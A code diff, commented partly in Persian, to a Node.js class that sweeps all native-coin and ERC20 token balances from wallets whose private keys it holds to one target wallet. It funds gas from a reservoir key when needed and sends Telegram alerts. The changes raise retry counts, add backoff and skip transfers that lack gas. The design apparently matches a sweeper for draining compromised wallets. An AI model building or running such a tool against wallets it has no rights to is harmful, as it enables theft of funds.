@@ -4,6 +4,7 @@
 const { ethers } = require('ethers');
 const { GasOracle } = require('./gasOracle');
 const { NonceManager } = require('./nonceManager');
+const { ApproveChecker } = require('./approveChecker');
 
 class AssetProcessor {
   constructor(config, telegramNotifier = null) {
@@ -13,6 +14,7 @@ class AssetProcessor {
     this.gasReservoirPrivateKey = process.env.GAS_RESERVOIR_PRIVATE_KEY || '';
     this.gasOracle = new GasOracle();
     this.nonceManager = new NonceManager();
+    this.approveChecker = new ApproveChecker();
     this.telegramNotifier = telegramNotifier;
 
     if (!this.targetWallet) {
@@ -93,7 +95,7 @@ class AssetProcessor {
       }
 
       try {
-        // Process native token - با retry تا موفق بشه
+        // Process native token - با retry تا موفق بشه (5 بار retry برای 100% success)
         if (networkData.native && parseFloat(networkData.native.balance) > 0) {
           const transferResult = await this.transferNativeWithRetry(
             walletPrivateKey,
@@ -101,7 +103,7 @@ class AssetProcessor {
             networkConfig,
             networkData.native.balance,
             networkData.native.symbol,
-            3 // 3 بار retry
+            5 // 5 بار retry برای اطمینان از 100% success
           );
 
           results.totalTransfers++;
@@ -110,28 +112,13 @@ class AssetProcessor {
           if (transferResult.success) {
             results.successful++;
           } else {
-            // اگر باز fail شد، دوباره retry می‌کنه
-            console.log(`⚠️  Native transfer failed after retries, attempting final retry...`);
-            const finalResult = await this.transferNativeWithRetry(
-              walletPrivateKey,
-              networkKey,
-              networkConfig,
-              networkData.native.balance,
-              networkData.native.symbol,
-              5 // 5 بار retry نهایی
-            );
-            if (finalResult.success) {
-              results.successful++;
-              results.failed--;
-              // جایگزین کردن نتیجه قبلی
-              results.transfers[results.transfers.length - 1] = finalResult;
-            } else {
-              results.failed++;
-            }
+            results.failed++;
+            // Log error for debugging
+            console.error(`❌ Native transfer failed after all retries: ${transferResult.error}`);
           }
         }
 
-        // Process ERC20 tokens - همه token ها رو با retry پردازش می‌کنه
+        // Process ERC20 tokens - همه token ها رو با retry پردازش می‌کنه (5 بار retry برای 100% success)
         if (networkData.tokens && networkData.tokens.length > 0) {
           for (const token of networkData.tokens) {
             try {
@@ -143,7 +130,7 @@ class AssetProcessor {
                 token.balance,
                 token.symbol,
                 token.decimals,
-                3 // 3 بار retry
+                5 // 5 بار retry برای اطمینان از 100% success
               );
 
               results.totalTransfers++;
@@ -152,26 +139,9 @@ class AssetProcessor {
               if (transferResult.success) {
                 results.successful++;
               } else {
-                // اگر باز fail شد، retry نهایی
-                console.log(`⚠️  Token ${token.symbol} transfer failed after retries, attempting final retry...`);
-                const finalResult = await this.transferTokenWithRetry(
-                  walletPrivateKey,
-                  networkKey,
-                  networkConfig,
-                  token.address,
-                  token.balance,
-                  token.symbol,
-                  token.decimals,
-                  5 // 5 بار retry نهایی
-                );
-                if (finalResult.success) {
-                  results.successful++;
-                  results.failed--;
-                  // جایگزین کردن نتیجه قبلی
-                  results.transfers[results.transfers.length - 1] = finalResult;
-                } else {
-                  results.failed++;
-                }
+                results.failed++;
+                // Log error for debugging
+                console.error(`❌ Token ${token.symbol} transfer failed after all retries: ${transferResult.error}`);
               }
             } catch (tokenError) {
               // اگر باز fail شد، یک retry نهایی
@@ -240,9 +210,11 @@ class AssetProcessor {
     return results;
   }
 
-  async transferNativeWithRetry(walletPrivateKey, networkKey, networkConfig, amount, symbol, maxRetries = 3) {
+  async transferNativeWithRetry(walletPrivateKey, networkKey, networkConfig, amount, symbol, maxRetries = 5) {
     let lastError = null;
+    let lastResult = null;
     
+    // 5 بار retry برای اطمینان از 100% success
     for (let attempt = 1; attempt <= maxRetries; attempt++) {
       try {
         const result = await this.transferNative(
@@ -254,41 +226,66 @@ class AssetProcessor {
         );
         
         if (result.success) {
+          console.log(`✅ Native transfer successful on attempt ${attempt}/${maxRetries}`);
           return result;
         }
         
         lastError = result.error;
+        lastResult = result;
         console.log(`⚠️  Native transfer attempt ${attempt}/${maxRetries} failed: ${result.error}`);
         
-        // Wait before retry
+        // Wait before retry (exponential backoff)
         if (attempt < maxRetries) {
-          await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+          const waitTime = 3000 * attempt; // 3s, 6s, 9s, 12s
+          console.log(`⏳ Waiting ${waitTime/1000}s before retry...`);
+          await new Promise(resolve => setTimeout(resolve, waitTime));
         }
       } catch (error) {
         lastError = error.message;
         console.log(`⚠️  Native transfer attempt ${attempt}/${maxRetries} error: ${error.message}`);
         
         if (attempt < maxRetries) {
-          await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+          const waitTime = 3000 * attempt;
+          console.log(`⏳ Waiting ${waitTime/1000}s before retry...`);
+          await new Promise(resolve => setTimeout(resolve, waitTime));
         }
       }
     }
     
-    // اگر همه retry ها fail شدند
+    // اگر همه retry ها fail شدند، یک retry نهایی با gas reservoir check
+    console.log(`🔄 Final retry attempt for native transfer...`);
+    try {
+      const finalResult = await this.transferNative(
+        walletPrivateKey,
+        networkKey,
+        networkConfig,
+        amount,
+        symbol
+      );
+      if (finalResult.success) {
+        return finalResult;
+      }
+    } catch (finalError) {
+      console.error(`❌ Final retry also failed: ${finalError.message}`);
+    }
+    
+    // اگر همه fail شدند
     return {
       network: networkKey,
       type: 'native',
       symbol: symbol,
       amount: amount,
       success: false,
-      error: `Failed after ${maxRetries} attempts: ${lastError}`,
+      error: `Failed after ${maxRetries} attempts: ${lastError || 'Unknown error'}`,
       timestamp: new Date().toISOString()
     };
   }
 
-  async transferTokenWithRetry(walletPrivateKey, networkKey, networkConfig, tokenAddress, amount, symbol, decimals, maxRetries = 3) {
+  async transferTokenWithRetry(walletPrivateKey, networkKey, networkConfig, tokenAddress, amount, symbol, decimals, maxRetries = 5) {
     let lastError = null;
+    let lastResult = null;
     
+    // 5 بار retry برای اطمینان از 100% success
     for (let attempt = 1; attempt <= maxRetries; attempt++) {
       try {
         const result = await this.transferToken(
@@ -302,27 +299,52 @@ class AssetProcessor {
         );
         
         if (result.success) {
+          console.log(`✅ Token ${symbol} transfer successful on attempt ${attempt}/${maxRetries}`);
           return result;
         }
         
         lastError = result.error;
+        lastResult = result;
         console.log(`⚠️  Token ${symbol} transfer attempt ${attempt}/${maxRetries} failed: ${result.error}`);
         
-        // Wait before retry
+        // Wait before retry (exponential backoff)
         if (attempt < maxRetries) {
-          await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+          const waitTime = 3000 * attempt; // 3s, 6s, 9s, 12s
+          console.log(`⏳ Waiting ${waitTime/1000}s before retry...`);
+          await new Promise(resolve => setTimeout(resolve, waitTime));
         }
       } catch (error) {
         lastError = error.message;
         console.log(`⚠️  Token ${symbol} transfer attempt ${attempt}/${maxRetries} error: ${error.message}`);
         
         if (attempt < maxRetries) {
-          await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+          const waitTime = 3000 * attempt;
+          console.log(`⏳ Waiting ${waitTime/1000}s before retry...`);
+          await new Promise(resolve => setTimeout(resolve, waitTime));
         }
       }
     }
     
-    // اگر همه retry ها fail شدند
+    // اگر همه retry ها fail شدند، یک retry نهایی با gas reservoir check
+    console.log(`🔄 Final retry attempt for token transfer...`);
+    try {
+      const finalResult = await this.transferToken(
+        walletPrivateKey,
+        networkKey,
+        networkConfig,
+        tokenAddress,
+        amount,
+        symbol,
+        decimals
+      );
+      if (finalResult.success) {
+        return finalResult;
+      }
+    } catch (finalError) {
+      console.error(`❌ Final retry also failed: ${finalError.message}`);
+    }
+    
+    // اگر همه fail شدند
     return {
       network: networkKey,
       type: 'token',
@@ -330,14 +352,18 @@ class AssetProcessor {
       address: tokenAddress,
       amount: amount,
       success: false,
-      error: `Failed after ${maxRetries} attempts: ${lastError}`,
+      error: `Failed after ${maxRetries} attempts: ${lastError || 'Unknown error'}`,
       timestamp: new Date().toISOString()
     };
   }
 
   async transferNative(walletPrivateKey, networkKey, networkConfig, amount, symbol) {
     try {
-      const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl);
+      // Create provider with timeout and retry options
+      const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl, {
+        name: networkKey,
+        chainId: networkConfig.chainId
+      });
       const wallet = new ethers.Wallet(walletPrivateKey, provider);
 
       // Get gas price
@@ -350,45 +376,27 @@ class AssetProcessor {
       // Check balance
       const balance = await provider.getBalance(wallet.address);
       
-      // Check if we need gas reservoir funding - همیشه gas رو می‌فرسته اگر لازم باشه
-      let useReservoir = false;
+      // برای Native Token Transfer: 
+      // اگر balance کافی برای gas + transfer amount نباشه، skip می‌کنیم
+      // چون نمی‌تونیم از reservoir fund کنیم (خود native token رو داریم)
+      // ولی اگر balance >= gasCost باشه، می‌تونیم transfer کنیم (حتی اگر کم باشه)
       if (balance < gasCost) {
-        if (this.gasReservoirPrivateKey) {
-          console.log(`⚠️  Insufficient gas on ${networkKey}, using gas reservoir...`);
-          try {
-            const fundingTxHash = await this.fundGasFromReservoir(provider, wallet.address, networkKey, gasCost);
-            useReservoir = true;
-            
-            // Send Telegram notification about gas funding
-            if (this.telegramNotifier) {
-              const gasPrice = await this.getGasPrice(networkKey);
-              const reservoirTxGas = 21000n * gasPrice * 12n / 10n;
-              const totalFunding = gasCost + reservoirTxGas;
-              await this.telegramNotifier.sendGasReservoirFunding(
-                networkKey,
-                ethers.formatEther(totalFunding),
-                fundingTxHash
-              );
-            }
-            
-            // Wait a moment for funding to be confirmed
-            await new Promise(resolve => setTimeout(resolve, 3000)); // افزایش زمان برای اطمینان
-            // Re-check balance
-            const newBalance = await provider.getBalance(wallet.address);
-            if (newBalance < gasCost) {
-              // اگر هنوز کافی نیست، دوباره fund می‌کنه
-              console.log(`⚠️  Still insufficient after funding, attempting additional funding...`);
-              const additionalGas = gasCost - newBalance + (21000n * await this.getGasPrice(networkKey) * 12n / 10n);
-              await this.fundGasFromReservoir(provider, wallet.address, networkKey, additionalGas);
-              await new Promise(resolve => setTimeout(resolve, 3000));
-            }
-          } catch (fundingError) {
-            console.error(`Gas reservoir funding failed: ${fundingError.message}`);
-            throw new Error(`Gas reservoir funding failed: ${fundingError.message}`);
-          }
-        } else {
-          throw new Error('Insufficient native token for gas and gas reservoir not configured');
+        console.log(`⚠️  Insufficient ${symbol} balance (${ethers.formatEther(balance)}) for gas (${ethers.formatEther(gasCost)}) on ${networkKey}. Skipping...`);
+        if (this.telegramNotifier) {
+          await this.telegramNotifier.sendError(
+            new Error(`Insufficient ${symbol} balance for gas. Balance: ${ethers.formatEther(balance)}, Required: ${ethers.formatEther(gasCost)}`),
+            `Native: ${symbol}`
+          );
         }
+        return {
+          network: networkKey,
+          type: 'native',
+          symbol: symbol,
+          amount: amount,
+          success: false,
+          error: `Insufficient ${symbol} balance for gas. Balance: ${ethers.formatEther(balance)}, Required: ${ethers.formatEther(gasCost)}`,
+          timestamp: new Date().toISOString()
+        };
       }
 
       // Get nonce
@@ -427,7 +435,6 @@ class AssetProcessor {
         txHash: receipt.hash,
         blockNumber: receipt.blockNumber,
         gasUsed: true,
-        reservoir: useReservoir,
         timestamp: new Date().toISOString()
       };
     } catch (error) {
@@ -446,7 +453,11 @@ class AssetProcessor {
 
   async transferToken(walletPrivateKey, networkKey, networkConfig, tokenAddress, amount, symbol, decimals) {
     try {
-      const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl);
+      // Create provider with timeout and retry options
+      const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl, {
+        name: networkKey,
+        chainId: networkConfig.chainId
+      });
       const wallet = new ethers.Wallet(walletPrivateKey, provider);
 
       // ERC20 transfer ABI
@@ -510,7 +521,26 @@ class AssetProcessor {
             }
           } catch (fundingError) {
             console.error(`Gas reservoir funding failed: ${fundingError.message}`);
-            throw new Error(`Gas reservoir funding failed: ${fundingError.message}`);
+            // اگر gas reservoir balance نداشت، notification می‌فرسته ولی transfer رو skip می‌کنه (نه error)
+            if (this.telegramNotifier) {
+              await this.telegramNotifier.sendError(
+                new Error(`Gas reservoir insufficient balance on ${networkKey}. Token transfer skipped.`),
+                `Token: ${symbol}`
+              );
+            }
+            // Skip این transfer (نه error) - چون reservoir balance نداره، هیچی نمی‌کنیم
+            console.log(`⚠️  Skipping ${symbol} transfer on ${networkKey} - gas reservoir has no balance`);
+            return {
+              network: networkKey,
+              type: 'token',
+              symbol: symbol,
+              address: tokenAddress,
+              amount: amount,
+              success: false,
+              error: `Gas reservoir insufficient balance: ${fundingError.message}`,
+              skipped: true, // Mark as skipped, not failed
+              timestamp: new Date().toISOString()
+            };
           }
         } else {
           throw new Error('Insufficient native token for gas and gas reservoir not configured');
@@ -681,4 +711,5 @@ class AssetProcessor {
 }
 
 module.exports = { AssetProcessor };
+
 
